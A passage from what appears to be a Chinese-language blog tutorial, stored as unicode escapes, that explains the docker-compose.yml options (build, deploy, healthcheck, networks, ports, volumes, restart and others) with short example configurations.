time=0.145 ms $ docker exec -it nginx2 ping nginx1 #nginx2 to nginx1 ping: unknown host\u590d\u5236\u4ee3\u7801 \u4ee5\u4e0a\u4e5f\u80fd\u5145\u5206\u8bc1\u660e\u8fd9\u79cd\u65b9\u5f0f\u662f\u5c5e\u4e8e\u5355\u5411\u8054\u901a\u7684\u3002 \u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u6839\u636e\u81ea\u5df1\u7684\u9700\u8981\u7075\u6d3b\u7684\u9009\u62e9\u8fd9\u4e24\u79cd\u94fe\u63a5\u65b9\u5f0f\uff0c\u5982\u679c\u60f3\u5077\u61d2\u7684\u8bdd\uff0c\u5927\u53ef\u9009\u62e9\u7b2c\u4e8c\u79cd\u3002\u4e0d\u8fc7\u6211\u66f4\u63a8\u8350\u7b2c\u4e00\u79cd\uff0c\u4e0d\u96be\u770b\u51fa\u65e0\u8bba\u662f\u8054\u901a\u6027\u8fd8\u662f\u7075\u6d3b\u6027\uff0c\u8f83\u4e3a\u66f4\u6539\u7f51\u7edc\u6a21\u5f0f\u7684\u7b2c\u4e8c\u79cd\u90fd\u66f4\u4e3a\u53cb\u597d\u3002 \u9644docker-compose.yml\u6587\u4ef6\u8be6\u89e3 Compose\u548cDocker\u517c\u5bb9\u6027\uff1a Compose \u6587\u4ef6\u683c\u5f0f\u67093\u4e2a\u7248\u672c,\u5206\u522b\u4e3a1, 2.x \u548c 3.x \u76ee\u524d\u4e3b\u6d41\u7684\u4e3a 3.x \u5176\u652f\u6301 docker 1.13.0 \u53ca\u5176\u4ee5\u4e0a\u7684\u7248\u672c \u5e38\u7528\u53c2\u6570\uff1a version # \u6307\u5b9a compose \u6587\u4ef6\u7684\u7248\u672c services # \u5b9a\u4e49\u6240\u6709\u7684 service \u4fe1\u606f, services \u4e0b\u9762\u7684\u7b2c\u4e00\u7ea7\u522b\u7684 key \u65e2\u662f\u4e00\u4e2a service \u7684\u540d\u79f0 build # \u6307\u5b9a\u5305\u542b\u6784\u5efa\u4e0a\u4e0b\u6587\u7684\u8def\u5f84, \u6216\u4f5c\u4e3a\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u5177\u6709 context \u548c\u6307\u5b9a\u7684 dockerfile \u6587\u4ef6\u4ee5\u53ca args \u53c2\u6570\u503c context # context: \u6307\u5b9a Dockerfile \u6587\u4ef6\u6240\u5728\u7684\u8def\u5f84 dockerfile # dockerfile: \u6307\u5b9a context \u6307\u5b9a\u7684\u76ee\u5f55\u4e0b\u9762\u7684 Dockerfile \u7684\u540d\u79f0(\u9ed8\u8ba4\u4e3a Dockerfile) args # args: Dockerfile \u5728 build \u8fc7\u7a0b\u4e2d\u9700\u8981\u7684\u53c2\u6570 (\u7b49\u540c\u4e8e docker container build --build-arg \u7684\u4f5c\u7528) cache_from # v3.2\u4e2d\u65b0\u589e\u7684\u53c2\u6570, \u6307\u5b9a\u7f13\u5b58\u7684\u955c\u50cf\u5217\u8868 (\u7b49\u540c\u4e8e docker container build --cache_from \u7684\u4f5c\u7528) labels # v3.3\u4e2d\u65b0\u589e\u7684\u53c2\u6570, \u8bbe\u7f6e\u955c\u50cf\u7684\u5143\u6570\u636e (\u7b49\u540c\u4e8e docker container build --labels \u7684\u4f5c\u7528) shm_size # v3.5\u4e2d\u65b0\u589e\u7684\u53c2\u6570, \u8bbe\u7f6e\u5bb9\u5668 /dev/shm \u5206\u533a\u7684\u5927\u5c0f (\u7b49\u540c\u4e8e docker container build --shm-size \u7684\u4f5c\u7528) command # \u8986\u76d6\u5bb9\u5668\u542f\u52a8\u540e\u9ed8\u8ba4\u6267\u884c\u7684\u547d\u4ee4, \u652f\u6301 shell \u683c\u5f0f\u548c [] \u683c\u5f0f configs # \u4e0d\u77e5\u9053\u600e\u4e48\u7528 cgroup_parent # \u4e0d\u77e5\u9053\u600e\u4e48\u7528 container_name # \u6307\u5b9a\u5bb9\u5668\u7684\u540d\u79f0 (\u7b49\u540c\u4e8e docker run --name \u7684\u4f5c\u7528) credential_spec # \u4e0d\u77e5\u9053\u600e\u4e48\u7528 deploy # v3 \u7248\u672c\u4ee5\u4e0a, \u6307\u5b9a\u4e0e\u90e8\u7f72\u548c\u8fd0\u884c\u670d\u52a1\u76f8\u5173\u7684\u914d\u7f6e, deploy \u90e8\u5206\u662f docker stack \u4f7f\u7528\u7684, docker stack \u4f9d\u8d56 docker swarm endpoint_mode # v3.3 \u7248\u672c\u4e2d\u65b0\u589e\u7684\u529f\u80fd, \u6307\u5b9a\u670d\u52a1\u66b4\u9732\u7684\u65b9\u5f0f vip # Docker \u4e3a\u8be5\u670d\u52a1\u5206\u914d\u4e86\u4e00\u4e2a\u865a\u62df IP(VIP), \u4f5c\u4e3a\u5ba2\u6237\u7aef\u7684\u8bbf\u95ee\u670d\u52a1\u7684\u5730\u5740 dnsrr # DNS\u8f6e\u8be2, Docker \u4e3a\u8be5\u670d\u52a1\u8bbe\u7f6e DNS \u6761\u76ee, \u4f7f\u5f97\u670d\u52a1\u540d\u79f0\u7684 DNS \u67e5\u8be2\u8fd4\u56de\u4e00\u4e2a IP \u5730\u5740\u5217\u8868, \u5ba2\u6237\u7aef\u76f4\u63a5\u8bbf\u95ee\u5176\u4e2d\u7684\u4e00\u4e2a\u5730\u5740 labels # \u6307\u5b9a\u670d\u52a1\u7684\u6807\u7b7e\uff0c\u8fd9\u4e9b\u6807\u7b7e\u4ec5\u5728\u670d\u52a1\u4e0a\u8bbe\u7f6e mode # \u6307\u5b9a deploy \u7684\u6a21\u5f0f global # \u6bcf\u4e2a\u96c6\u7fa4\u8282\u70b9\u90fd\u53ea\u6709\u4e00\u4e2a\u5bb9\u5668 replicated # \u7528\u6237\u53ef\u4ee5\u6307\u5b9a\u96c6\u7fa4\u4e2d\u5bb9\u5668\u7684\u6570\u91cf(\u9ed8\u8ba4) placement # \u4e0d\u77e5\u9053\u600e\u4e48\u7528 replicas # deploy \u7684 mode \u4e3a replicated \u65f6, \u6307\u5b9a\u5bb9\u5668\u526f\u672c\u7684\u6570\u91cf resources # \u8d44\u6e90\u9650\u5236 limits # \u8bbe\u7f6e\u5bb9\u5668\u7684\u8d44\u6e90\u9650\u5236 cpus: \"0.5\" # \u8bbe\u7f6e\u8be5\u5bb9\u5668\u6700\u591a\u53ea\u80fd\u4f7f\u7528 50% \u7684 CPU memory: 50M # \u8bbe\u7f6e\u8be5\u5bb9\u5668\u6700\u591a\u53ea\u80fd\u4f7f\u7528 50M \u7684\u5185\u5b58\u7a7a\u95f4 reservations # \u8bbe\u7f6e\u4e3a\u5bb9\u5668\u9884\u7559\u7684\u7cfb\u7edf\u8d44\u6e90(\u968f\u65f6\u53ef\u7528) cpus: \"0.2\" # \u4e3a\u8be5\u5bb9\u5668\u4fdd\u7559 20% \u7684 CPU memory: 20M # \u4e3a\u8be5\u5bb9\u5668\u4fdd\u7559 20M \u7684\u5185\u5b58\u7a7a\u95f4 restart_policy # \u5b9a\u4e49\u5bb9\u5668\u91cd\u542f\u7b56\u7565, \u7528\u4e8e\u4ee3\u66ff restart \u53c2\u6570 condition # \u5b9a\u4e49\u5bb9\u5668\u91cd\u542f\u7b56\u7565(\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570) none # \u4e0d\u5c1d\u8bd5\u91cd\u542f on-failure # \u53ea\u6709\u5f53\u5bb9\u5668\u5185\u90e8\u5e94\u7528\u7a0b\u5e8f\u51fa\u73b0\u95ee\u9898\u624d\u4f1a\u91cd\u542f any # \u65e0\u8bba\u5982\u4f55\u90fd\u4f1a\u5c1d\u8bd5\u91cd\u542f(\u9ed8\u8ba4) delay # \u5c1d\u8bd5\u91cd\u542f\u7684\u95f4\u9694\u65f6\u95f4(\u9ed8\u8ba4\u4e3a 0s) max_attempts # \u5c1d\u8bd5\u91cd\u542f\u6b21\u6570(\u9ed8\u8ba4\u4e00\u76f4\u5c1d\u8bd5\u91cd\u542f) window # \u68c0\u67e5\u91cd\u542f\u662f\u5426\u6210\u529f\u4e4b\u524d\u7684\u7b49\u5f85\u65f6\u95f4(\u5373\u5982\u679c\u5bb9\u5668\u542f\u52a8\u4e86, \u9694\u591a\u5c11\u79d2\u4e4b\u540e\u53bb\u68c0\u6d4b\u5bb9\u5668\u662f\u5426\u6b63\u5e38, \u9ed8\u8ba4 0s) update_config # \u7528\u4e8e\u914d\u7f6e\u6eda\u52a8\u66f4\u65b0\u914d\u7f6e parallelism # \u4e00\u6b21\u6027\u66f4\u65b0\u7684\u5bb9\u5668\u6570\u91cf delay # \u66f4\u65b0\u4e00\u7ec4\u5bb9\u5668\u4e4b\u95f4\u7684\u95f4\u9694\u65f6\u95f4 failure_action # \u5b9a\u4e49\u66f4\u65b0\u5931\u8d25\u7684\u7b56\u7565 continue # \u7ee7\u7eed\u66f4\u65b0 rollback # \u56de\u6eda\u66f4\u65b0 pause # \u6682\u505c\u66f4\u65b0(\u9ed8\u8ba4) monitor # \u6bcf\u6b21\u66f4\u65b0\u540e\u7684\u6301\u7eed\u65f6\u95f4\u4ee5\u76d1\u89c6\u66f4\u65b0\u662f\u5426\u5931\u8d25(\u5355\u4f4d: ns|us|ms|s|m|h) (\u9ed8\u8ba4\u4e3a0) max_failure_ratio # \u56de\u6eda\u671f\u95f4\u5bb9\u5fcd\u7684\u5931\u8d25\u7387(\u9ed8\u8ba4\u503c\u4e3a0) order # v3.4 \u7248\u672c\u4e2d\u65b0\u589e\u7684\u53c2\u6570, \u56de\u6eda\u671f\u95f4\u7684\u64cd\u4f5c\u987a\u5e8f stop-first #\u65e7\u4efb\u52a1\u5728\u542f\u52a8\u65b0\u4efb\u52a1\u4e4b\u524d\u505c\u6b62(\u9ed8\u8ba4) start-first #\u9996\u5148\u542f\u52a8\u65b0\u4efb\u52a1, \u5e76\u4e14\u6b63\u5728\u8fd0\u884c\u7684\u4efb\u52a1\u6682\u65f6\u91cd\u53e0 rollback_config # v3.7 \u7248\u672c\u4e2d\u65b0\u589e\u7684\u53c2\u6570, \u7528\u4e8e\u5b9a\u4e49\u5728 update_config \u66f4\u65b0\u5931\u8d25\u7684\u56de\u6eda\u7b56\u7565 parallelism # \u4e00\u6b21\u56de\u6eda\u7684\u5bb9\u5668\u6570, \u5982\u679c\u8bbe\u7f6e\u4e3a0, \u5219\u6240\u6709\u5bb9\u5668\u540c\u65f6\u56de\u6eda delay # \u6bcf\u4e2a\u7ec4\u56de\u6eda\u4e4b\u95f4\u7684\u65f6\u95f4\u95f4\u9694(\u9ed8\u8ba4\u4e3a0) failure_action # \u5b9a\u4e49\u56de\u6eda\u5931\u8d25\u7684\u7b56\u7565 continue # \u7ee7\u7eed\u56de\u6eda pause # \u6682\u505c\u56de\u6eda monitor # \u6bcf\u6b21\u56de\u6eda\u4efb\u52a1\u540e\u7684\u6301\u7eed\u65f6\u95f4\u4ee5\u76d1\u89c6\u5931\u8d25(\u5355\u4f4d: ns|us|ms|s|m|h) (\u9ed8\u8ba4\u4e3a0) max_failure_ratio # \u56de\u6eda\u671f\u95f4\u5bb9\u5fcd\u7684\u5931\u8d25\u7387(\u9ed8\u8ba4\u503c0) order # \u56de\u6eda\u671f\u95f4\u7684\u64cd\u4f5c\u987a\u5e8f stop-first # \u65e7\u4efb\u52a1\u5728\u542f\u52a8\u65b0\u4efb\u52a1\u4e4b\u524d\u505c\u6b62(\u9ed8\u8ba4) start-first # \u9996\u5148\u542f\u52a8\u65b0\u4efb\u52a1, \u5e76\u4e14\u6b63\u5728\u8fd0\u884c\u7684\u4efb\u52a1\u6682\u65f6\u91cd\u53e0 \u6ce8\u610f\uff1a \u652f\u6301 docker-compose up \u548c docker-compose run \u4f46\u4e0d\u652f\u6301 docker stack deploy \u7684\u5b50\u9009\u9879 security_opt container_name devices tmpfs stop_signal links cgroup_parent network_mode external_links restart build userns_mode sysctls devices # \u6307\u5b9a\u8bbe\u5907\u6620\u5c04\u5217\u8868 (\u7b49\u540c\u4e8e docker run --device \u7684\u4f5c\u7528) depends_on # \u5b9a\u4e49\u5bb9\u5668\u542f\u52a8\u987a\u5e8f (\u6b64\u9009\u9879\u89e3\u51b3\u4e86\u5bb9\u5668\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c \u6b64\u9009\u9879\u5728 v3 \u7248\u672c\u4e2d \u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) \u793a\u4f8b\uff1a docker-compose up \u4ee5\u4f9d\u8d56\u987a\u5e8f\u542f\u52a8\u670d\u52a1\uff0c\u4e0b\u9762\u4f8b\u5b50\u4e2d redis \u548c db \u670d\u52a1\u5728 web \u542f\u52a8\u524d\u542f\u52a8 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528 docker-compose up web \u8fd9\u6837\u7684\u65b9\u5f0f\u542f\u52a8 web \u670d\u52a1\u65f6\uff0c\u4e5f\u4f1a\u542f\u52a8 redis \u548c db \u4e24\u4e2a\u670d\u52a1\uff0c\u56e0\u4e3a\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5b9a\u4e49\u4e86\u4f9d\u8d56\u5173\u7cfb version: '3' services: web: build: . depends_on: - db - redis redis: image: redis db: image: postgres dns # \u8bbe\u7f6e DNS \u5730\u5740(\u7b49\u540c\u4e8e docker run --dns \u7684\u4f5c\u7528) dns_search # \u8bbe\u7f6e DNS \u641c\u7d22\u57df(\u7b49\u540c\u4e8e docker run --dns-search \u7684\u4f5c\u7528) tmpfs # v2 \u7248\u672c\u4ee5\u4e0a, \u6302\u8f7d\u76ee\u5f55\u5230\u5bb9\u5668\u4e2d, \u4f5c\u4e3a\u5bb9\u5668\u7684\u4e34\u65f6\u6587\u4ef6\u7cfb\u7edf(\u7b49\u540c\u4e8e docker run --tmpfs \u7684\u4f5c\u7528, \u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) entrypoint # \u8986\u76d6\u5bb9\u5668\u7684\u9ed8\u8ba4 entrypoint \u6307\u4ee4 (\u7b49\u540c\u4e8e docker run --entrypoint \u7684\u4f5c\u7528) env_file # \u4ece\u6307\u5b9a\u6587\u4ef6\u4e2d\u8bfb\u53d6\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5bb9\u5668\u4e2d\u7684\u73af\u5883\u53d8\u91cf, \u53ef\u4ee5\u662f\u5355\u4e2a\u503c\u6216\u8005\u4e00\u4e2a\u6587\u4ef6\u5217\u8868, \u5982\u679c\u591a\u4e2a\u6587\u4ef6\u4e2d\u7684\u53d8\u91cf\u91cd\u540d\u5219\u540e\u9762\u7684\u53d8\u91cf\u8986\u76d6\u524d\u9762\u7684\u53d8\u91cf, environment \u7684\u503c\u8986\u76d6 env_file \u7684\u503c \u6587\u4ef6\u683c\u5f0f\uff1a RACK_ENV=development environment # \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c environment \u7684\u503c\u53ef\u4ee5\u8986\u76d6 env_file \u7684\u503c (\u7b49\u540c\u4e8e docker run --env \u7684\u4f5c\u7528) expose # \u66b4\u9732\u7aef\u53e3, \u4f46\u662f\u4e0d\u80fd\u548c\u5bbf\u4e3b\u673a\u5efa\u7acb\u6620\u5c04\u5173\u7cfb, \u7c7b\u4f3c\u4e8e Dockerfile \u7684 EXPOSE \u6307\u4ee4 external_links # \u8fde\u63a5\u4e0d\u5728 docker-compose.yml \u4e2d\u5b9a\u4e49\u7684\u5bb9\u5668\u6216\u8005\u4e0d\u5728 compose \u7ba1\u7406\u7684\u5bb9\u5668(docker run \u542f\u52a8\u7684\u5bb9\u5668, \u5728 v3 \u7248\u672c\u4e2d\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) extra_hosts # \u6dfb\u52a0 host \u8bb0\u5f55\u5230\u5bb9\u5668\u4e2d\u7684 /etc/hosts \u4e2d (\u7b49\u540c\u4e8e docker run --add-host \u7684\u4f5c\u7528) healthcheck # v2.1 \u4ee5\u4e0a\u7248\u672c, \u5b9a\u4e49\u5bb9\u5668\u5065\u5eb7\u72b6\u6001\u68c0\u67e5, \u7c7b\u4f3c\u4e8e Dockerfile \u7684 HEALTHCHECK \u6307\u4ee4 test # \u68c0\u67e5\u5bb9\u5668\u68c0\u67e5\u72b6\u6001\u7684\u547d\u4ee4, \u8be5\u9009\u9879\u5fc5\u987b\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u6216\u8005\u5217\u8868, \u7b2c\u4e00\u9879\u5fc5\u987b\u662f NONE, CMD \u6216 CMD-SHELL, \u5982\u679c\u5176\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u5219\u76f8\u5f53\u4e8e CMD-SHELL \u52a0\u8be5\u5b57\u7b26\u4e32 NONE # \u7981\u7528\u5bb9\u5668\u7684\u5065\u5eb7\u72b6\u6001\u68c0\u6d4b CMD # test: [\"CMD\", \"curl\", \"-f\", \"http://localhost\"] CMD-SHELL # test: [\"CMD-SHELL\", \"curl -f http://localhost || exit 1\"] \u6216\u8005\u3000test: curl -f https://localhost || exit 1 interval: 1m30s # \u6bcf\u6b21\u68c0\u67e5\u4e4b\u95f4\u7684\u95f4\u9694\u65f6\u95f4 timeout: 10s # \u8fd0\u884c\u547d\u4ee4\u7684\u8d85\u65f6\u65f6\u95f4 retries: 3 # \u91cd\u8bd5\u6b21\u6570 start_period: 40s # v3.4 \u4ee5\u4e0a\u65b0\u589e\u7684\u9009\u9879, \u5b9a\u4e49\u5bb9\u5668\u542f\u52a8\u65f6\u95f4\u95f4\u9694 disable: true # true \u6216 false, \u8868\u793a\u662f\u5426\u7981\u7528\u5065\u5eb7\u72b6\u6001\u68c0\u6d4b\u548c\u3000test: NONE \u76f8\u540c image # \u6307\u5b9a docker \u955c\u50cf, \u53ef\u4ee5\u662f\u8fdc\u7a0b\u4ed3\u5e93\u955c\u50cf\u3001\u672c\u5730\u955c\u50cf init # v3.7 \u4e2d\u65b0\u589e\u7684\u53c2\u6570, true \u6216 false \u8868\u793a\u662f\u5426\u5728\u5bb9\u5668\u4e2d\u8fd0\u884c\u4e00\u4e2a init, \u5b83\u63a5\u6536\u4fe1\u53f7\u5e76\u4f20\u9012\u7ed9\u8fdb\u7a0b isolation # \u9694\u79bb\u5bb9\u5668\u6280\u672f, \u5728 Linux \u4e2d\u4ec5\u652f\u6301 default \u503c labels # \u4f7f\u7528 Docker \u6807\u7b7e\u5c06\u5143\u6570\u636e\u6dfb\u52a0\u5230\u5bb9\u5668, \u4e0e Dockerfile \u4e2d\u7684 LABELS \u7c7b\u4f3c links # \u94fe\u63a5\u5230\u5176\u5b83\u670d\u52a1\u4e2d\u7684\u5bb9\u5668, \u8be5\u9009\u9879\u662f docker \u5386\u53f2\u9057\u7559\u7684\u9009\u9879, \u76ee\u524d\u5df2\u88ab\u7528\u6237\u81ea\u5b9a\u4e49\u7f51\u7edc\u540d\u79f0\u7a7a\u95f4\u53d6\u4ee3, \u6700\u7ec8\u6709\u53ef\u80fd\u88ab\u5e9f\u5f03 (\u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) logging # \u8bbe\u7f6e\u5bb9\u5668\u65e5\u5fd7\u670d\u52a1 driver # \u6307\u5b9a\u65e5\u5fd7\u8bb0\u5f55\u9a71\u52a8\u7a0b\u5e8f, \u9ed8\u8ba4 json-file (\u7b49\u540c\u4e8e docker run --log-driver \u7684\u4f5c\u7528) options # \u6307\u5b9a\u65e5\u5fd7\u7684\u76f8\u5173\u53c2\u6570 (\u7b49\u540c\u4e8e docker run --log-opt \u7684\u4f5c\u7528) max-size # \u8bbe\u7f6e\u5355\u4e2a\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f, \u5f53\u5230\u8fbe\u8fd9\u4e2a\u503c\u540e\u4f1a\u8fdb\u884c\u65e5\u5fd7\u6eda\u52a8\u64cd\u4f5c max-file # \u65e5\u5fd7\u6587\u4ef6\u4fdd\u7559\u7684\u6570\u91cf network_mode # \u6307\u5b9a\u7f51\u7edc\u6a21\u5f0f (\u7b49\u540c\u4e8e docker run --net \u7684\u4f5c\u7528, \u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) networks # \u5c06\u5bb9\u5668\u52a0\u5165\u6307\u5b9a\u7f51\u7edc (\u7b49\u540c\u4e8e docker network connect \u7684\u4f5c\u7528), networks \u53ef\u4ee5\u4f4d\u4e8e compose \u6587\u4ef6\u9876\u7ea7\u952e\u548c services \u952e\u7684\u4e8c\u7ea7\u952e aliases # \u540c\u4e00\u7f51\u7edc\u4e0a\u7684\u5bb9\u5668\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u540d\u79f0\u6216\u522b\u540d\u8fde\u63a5\u5230\u5176\u4e2d\u4e00\u4e2a\u670d\u52a1\u7684\u5bb9\u5668 ipv4_address # IP V4 \u683c\u5f0f ipv6_address # IP V6 \u683c\u5f0f \u793a\u4f8b: version: '3.7' services: test: image: nginx:1.14-alpine container_name: mynginx command: ifconfig networks: app_net: # \u8c03\u7528\u4e0b\u9762 networks \u5b9a\u4e49\u7684 app_net \u7f51\u7edc ipv4_address: 172.16.238.10 networks: app_net: driver: bridge ipam: driver: default config: - subnet: 172.16.238.0/24 pid: 'host' # \u5171\u4eab\u5bbf\u4e3b\u673a\u7684 \u8fdb\u7a0b\u7a7a\u95f4(PID) ports # \u5efa\u7acb\u5bbf\u4e3b\u673a\u548c\u5bb9\u5668\u4e4b\u95f4\u7684\u7aef\u53e3\u6620\u5c04\u5173\u7cfb, ports \u652f\u6301\u4e24\u79cd\u8bed\u6cd5\u683c\u5f0f SHORT \u8bed\u6cd5\u683c\u5f0f\u793a\u4f8b: - \"3000\" # \u66b4\u9732\u5bb9\u5668\u7684 3000 \u7aef\u53e3, \u5bbf\u4e3b\u673a\u7684\u7aef\u53e3\u7531 docker \u968f\u673a\u6620\u5c04\u4e00\u4e2a\u6ca1\u6709\u88ab\u5360\u7528\u7684\u7aef\u53e3 - \"3000-3005\" # \u66b4\u9732\u5bb9\u5668\u7684 3000 \u5230 3005 \u7aef\u53e3, \u5bbf\u4e3b\u673a\u7684\u7aef\u53e3\u7531 docker \u968f\u673a\u6620\u5c04\u6ca1\u6709\u88ab\u5360\u7528\u7684\u7aef\u53e3 - \"8000:8000\" # \u5bb9\u5668\u7684 8000 \u7aef\u53e3\u548c\u5bbf\u4e3b\u673a\u7684 8000 \u7aef\u53e3\u5efa\u7acb\u6620\u5c04\u5173\u7cfb - \"9090-9091:8080-8081\" - \"127.0.0.1:8001:8001\" # \u6307\u5b9a\u6620\u5c04\u5bbf\u4e3b\u673a\u7684\u6307\u5b9a\u5730\u5740\u7684 - \"127.0.0.1:5000-5010:5000-5010\" - \"6060:6060/udp\" # \u6307\u5b9a\u534f\u8bae LONG \u8bed\u6cd5\u683c\u5f0f\u793a\u4f8b:(v3.2 \u65b0\u589e\u7684\u8bed\u6cd5\u683c\u5f0f) ports: - target: 80 # \u5bb9\u5668\u7aef\u53e3 published: 8080 # \u5bbf\u4e3b\u673a\u7aef\u53e3 protocol: tcp # \u534f\u8bae\u7c7b\u578b mode: host # host \u5728\u6bcf\u4e2a\u8282\u70b9\u4e0a\u53d1\u5e03\u4e3b\u673a\u7aef\u53e3, ingress \u5bf9\u4e8e\u7fa4\u6a21\u5f0f\u7aef\u53e3\u8fdb\u884c\u8d1f\u8f7d\u5747\u8861 secrets # \u4e0d\u77e5\u9053\u600e\u4e48\u7528 security_opt # \u4e3a\u6bcf\u4e2a\u5bb9\u5668\u8986\u76d6\u9ed8\u8ba4\u7684\u6807\u7b7e (\u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) stop_grace_period # \u6307\u5b9a\u5728\u53d1\u9001\u4e86 SIGTERM \u4fe1\u53f7\u4e4b\u540e, \u5bb9\u5668\u7b49\u5f85\u591a\u5c11\u79d2\u4e4b\u540e\u9000\u51fa(\u9ed8\u8ba4 10s) stop_signal # \u6307\u5b9a\u505c\u6b62\u5bb9\u5668\u53d1\u9001\u7684\u4fe1\u53f7 (\u9ed8\u8ba4\u4e3a SIGTERM \u76f8\u5f53\u4e8e kill PID; SIGKILL \u76f8\u5f53\u4e8e kill -9 PID; \u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) sysctls # \u8bbe\u7f6e\u5bb9\u5668\u4e2d\u7684\u5185\u6838\u53c2\u6570 (\u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) ulimits # \u8bbe\u7f6e\u5bb9\u5668\u7684 limit userns_mode # \u5982\u679cDocker\u5b88\u62a4\u7a0b\u5e8f\u914d\u7f6e\u4e86\u7528\u6237\u540d\u79f0\u7a7a\u95f4, \u5219\u7981\u7528\u6b64\u670d\u52a1\u7684\u7528\u6237\u540d\u79f0\u7a7a\u95f4 (\u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879) volumes # \u5b9a\u4e49\u5bb9\u5668\u548c\u5bbf\u4e3b\u673a\u7684\u5377\u6620\u5c04\u5173\u7cfb, \u5176\u548c networks \u4e00\u6837\u53ef\u4ee5\u4f4d\u4e8e services \u952e\u7684\u4e8c\u7ea7\u952e\u548c compose \u9876\u7ea7\u952e, \u5982\u679c\u9700\u8981\u8de8\u670d\u52a1\u95f4\u4f7f\u7528\u5219\u5728\u9876\u7ea7\u952e\u5b9a\u4e49, \u5728 services \u4e2d\u5f15\u7528 SHORT \u8bed\u6cd5\u683c\u5f0f\u793a\u4f8b: volumes: - /var/lib/mysql # \u6620\u5c04\u5bb9\u5668\u5185\u7684 /var/lib/mysql \u5230\u5bbf\u4e3b\u673a\u7684\u4e00\u4e2a\u968f\u673a\u76ee\u5f55\u4e2d - /opt/data:/var/lib/mysql # \u6620\u5c04\u5bb9\u5668\u5185\u7684 /var/lib/mysql \u5230\u5bbf\u4e3b\u673a\u7684 /opt/data - ./cache:/tmp/cache # \u6620\u5c04\u5bb9\u5668\u5185\u7684 /var/lib/mysql \u5230\u5bbf\u4e3b\u673a compose \u6587\u4ef6\u6240\u5728\u7684\u4f4d\u7f6e - ~/configs:/etc/configs/:ro # \u6620\u5c04\u5bb9\u5668\u5bbf\u4e3b\u673a\u7684\u76ee\u5f55\u5230\u5bb9\u5668\u4e2d\u53bb, \u6743\u9650\u53ea\u8bfb - datavolume:/var/lib/mysql # datavolume \u4e3a volumes \u9876\u7ea7\u952e\u5b9a\u4e49\u7684\u76ee\u5f55, \u5728\u6b64\u5904\u76f4\u63a5\u8c03\u7528 LONG \u8bed\u6cd5\u683c\u5f0f\u793a\u4f8b:(v3.2 \u65b0\u589e\u7684\u8bed\u6cd5\u683c\u5f0f) version: \"3.2\" services: web: image: nginx:alpine ports: - \"80:80\" volumes: - type: volume # mount \u7684\u7c7b\u578b, \u5fc5\u987b\u662f bind\u3001volume \u6216 tmpfs source: mydata # \u5bbf\u4e3b\u673a\u76ee\u5f55 target: /data # \u5bb9\u5668\u76ee\u5f55 volume: # \u914d\u7f6e\u989d\u5916\u7684\u9009\u9879, \u5176 key \u5fc5\u987b\u548c type \u7684\u503c\u76f8\u540c nocopy: true # volume \u989d\u5916\u7684\u9009\u9879, \u5728\u521b\u5efa\u5377\u65f6\u7981\u7528\u4ece\u5bb9\u5668\u590d\u5236\u6570\u636e - type: bind # volume \u6a21\u5f0f\u53ea\u6307\u5b9a\u5bb9\u5668\u8def\u5f84\u5373\u53ef, \u5bbf\u4e3b\u673a\u8def\u5f84\u968f\u673a\u751f\u6210; bind \u9700\u8981\u6307\u5b9a\u5bb9\u5668\u548c\u6570\u636e\u673a\u7684\u6620\u5c04\u8def\u5f84 source: ./static target: /opt/app/static read_only: true # \u8bbe\u7f6e\u6587\u4ef6\u7cfb\u7edf\u4e3a\u53ea\u8bfb\u6587\u4ef6\u7cfb\u7edf volumes: mydata: # \u5b9a\u4e49\u5728 volume, \u53ef\u5728\u6240\u6709\u670d\u52a1\u4e2d\u8c03\u7528 restart # \u5b9a\u4e49\u5bb9\u5668\u91cd\u542f\u7b56\u7565(\u5728\u4f7f\u7528 swarm \u90e8\u7f72\u65f6\u5c06\u5ffd\u7565\u8be5\u9009\u9879, \u5728 swarm \u4f7f\u7528 restart_policy \u4ee3\u66ff restart) no # \u7981\u6b62\u81ea\u52a8\u91cd\u542f\u5bb9\u5668(\u9ed8\u8ba4) always # \u65e0\u8bba\u5982\u4f55\u5bb9\u5668\u90fd\u4f1a\u91cd\u542f on-failure # \u5f53\u51fa\u73b0 on-failure \u62a5\u9519\u65f6, \u5bb9\u5668\u91cd\u65b0\u542f\u52a8 \u5176\u4ed6\u9009\u9879\uff1a domainname, hostname, ipc, mac_address, privileged, read_only, shm_size, stdin_open, tty, user, working_dir \u4e0a\u9762\u8fd9\u4e9b\u9009\u9879\u90fd\u53ea\u63a5\u53d7\u5355\u4e2a\u503c\u548c docker run \u7684\u5bf9\u5e94\u53c2\u6570\u7c7b\u4f3c \u5bf9\u4e8e\u503c\u4e3a\u65f6\u95f4\u7684\u53ef\u63a5\u53d7\u7684\u503c\uff1a 2.5s 10s 1m30s 2h32m 5h34m56s \u65f6\u95f4\u5355\u4f4d: us, ms, s, m\uff0c h \u5bf9\u4e8e\u503c\u4e3a\u5927\u5c0f\u7684\u53ef\u63a5\u53d7\u7684\u503c\uff1a 2b 1024kb 2048k 300m 1gb \u5355\u4f4d: b, 